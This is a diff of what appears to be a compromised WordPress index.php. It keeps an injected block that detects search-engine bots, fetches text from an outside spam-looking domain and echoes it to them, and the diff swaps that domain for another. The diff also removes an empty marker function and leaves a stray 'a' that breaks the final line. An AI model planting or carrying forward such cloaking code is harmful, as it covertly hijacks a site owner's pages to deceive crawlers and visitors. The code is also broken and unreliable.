@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('https://hptotoasli.xyz/artzone/');
+    $message = file_get_contents('https://percetakanbandung.org/rabiana');
     echo $message;
 exit; // Atau bisa menggunakan die()
 }
@@ -32,10 +32,7 @@ exit; // Atau bisa menggunakan die()
  *
  * @var bool
  */
-
-define('WP_USE_THEMES', true);
-function DCVWVY()
-{}
+define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+require __DIR__ . '/wp-blog-header.php';a
